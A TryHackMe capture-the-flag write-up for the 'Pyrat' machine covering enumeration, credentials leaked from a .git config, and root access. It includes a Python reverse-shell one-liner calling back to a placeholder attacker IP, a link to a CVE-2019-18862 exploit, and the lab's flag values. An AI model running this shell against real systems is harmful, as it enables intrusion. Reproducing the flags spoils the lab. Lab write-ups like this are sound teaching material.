🏴 Pyrat – TryHackMe Write-Up

Note: Always use Incognito Mode while accessing TryHackMe machines.
Cached data can cause unexpected errors.

📌 Important Notes

Always use Incognito mode for web access

Browser cache may lead to misleading behavior

Maintain proper entries in /etc/hosts

Study tools carefully and understand logic & workflow

Document findings properly (important for reports & GitHub)

🔍 Initial Enumeration
Nmap Scan
nmap -sC -sV <target-ip>


Open Ports:

22/tcp    open  ssh
8000/tcp  open  http

🌐 Service Enumeration (Port 8000)

Connecting to the service:

nc <target-ip> 8000

Testing Python Code Execution
print(os.listdir("/root"))
# Permission denied

print(os.listdir("/opt/dev/.git/"))


📌 Access to .git directory revealed sensitive information.

🔑 Credential Discovery

Inside .git configuration:

[credential "https://github.com"]
    username = think
    password = _TH1NKINGPirate$_

🐚 Reverse Shell Access
Terminal 1 (Payload Execution)
echo 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("YOUR-IP",4000));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty; pty.spawn("sh")' | nc <target-ip> 8000

Terminal 2 (Listener)
nc -lvnp 4000


📌 Successfully obtained a shell.

👤 User Access (think)

Using discovered credentials:

ssh think@<target-ip>

User Flag
996bdb1f619a68361417cabca5454705

🔎 Privilege Escalation Enumeration
Running Processes
ps aux | grep root


Output revealed:

root  python3 /root/pyrat.py


📌 Script running as root:

/root/pyrat.py

🧠 Script Analysis

From /root/pyrat.py:

Discovered hidden admin endpoint

Admin username ≠ system username

Password required

🔓 Privilege Escalation Techniques Used

LinPEAS (Linux Privilege Escalation Awesome Script)

Password Brute Force (after discovering endpoint)

CVE-2019-18862 (LD_PRELOAD exploit)
👉 https://github.com/bcoles/local-exploits/blob/master/CVE-2019-18862/exploit.ldpreload.sh

🔐 Admin Access
nc <target-ip> 8000

Username: admin
Password: abc123


📌 Root shell obtained.

🏁 Root Flag
print(open('/root/root.txt', 'r').read())

ba5ed03e9e74bb98054438480165e221

🏆 Flags Summary
Flag Type	Value
User Flag	996bdb1f619a68361417cabca5454705
Root Flag	ba5ed03e9e74bb98054438480165e221
🧩 Key Learnings

Misconfigured .git directories leak credentials

Python code execution can lead to full compromise

Always inspect running root processes

Privilege escalation often hides in custom scripts

Understanding workflow > blindly running tools

🚀 Tools Used

Nmap

Netcat

SSH

LinPEAS

Python Reverse Shell

Git Enumeration****
